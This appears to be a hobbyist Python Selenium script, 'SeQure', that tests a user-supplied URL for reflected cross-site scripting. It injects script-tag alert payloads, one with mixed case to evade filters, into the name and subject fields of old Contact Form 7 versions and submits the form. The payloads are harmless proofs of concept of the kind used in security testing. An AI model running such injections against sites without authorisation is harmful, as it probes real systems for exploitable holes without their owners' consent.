from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
import time
import os

def storedCrossSite():
    print()

def cookieCrossSite():
    print()

def reflectedCrossSite(url):
    s = Service("C:/Users/alexi/Desktop/chromedriver/chromedriver")
    driver = webdriver.Chrome(service=s) # path to chromedriver
    driver.get(url)
    # This finds the element and passes in a script
    driver.find_element(By.NAME, 'your-name').send_keys("<Script>alert('Script Passed #name.')</scripT>") # cf7 version 2.0.1; 4.0.1
    driver.find_element(By.NAME, 'your-subject').send_keys("<script>alert('Script Passed #script.')</script>") # cf7 version 2.0.1
    #driver.find_element(By.NAME, 'ninja_forms_field_1').send_keys("<script>alert('alert')</script>")
    #driver.find_element(By.NAME, 'ninja_forms_field_3').send_keys("Message trial #2")
    # this finds the button
    #button = driver.find_element(By.ID, 'ninja_forms_field_4')
    button = driver.find_element(By.XPATH, "//input[@type='submit']") # button for version 2.0.1
    # button = driver.find_element(By.XPATH,"//input[@class='wpcf7-form-control wpcf7-submit']") # button for version 4.0.1
    time.sleep(10) # sleeps for 5 seconds
    # this clicks the button
    driver.execute_script("arguments[0].click();", button)
    time.sleep(5) # sleeps for 5 seconds
    driver.quit() # closes the window

if __name__ == "__main__":
    clear = lambda: os.system('cls')
    clear() # clear screen
    print("[+] Welcome to SeQure!\n") # starting prompt
    url = input("[+] Enter the URL you would like to check: ")
    print("------------------------------------------------------------------------------------------")
    #driver.get("https://lex.chompe.rs/contact-form-v4-0-1/") # version 4.0.1
    #driver.get("https://lex.chompe.rs/contact-form-7-v1-1/") # version 2.0.1
    # ninja form url: https://lex.chompe.rs/ninja-forms/ https://lex.chompe.rs/contact-form-7-v3-1/
    reflectedCrossSite(url)
    # https://xss-game.appspot.com/level1/frame
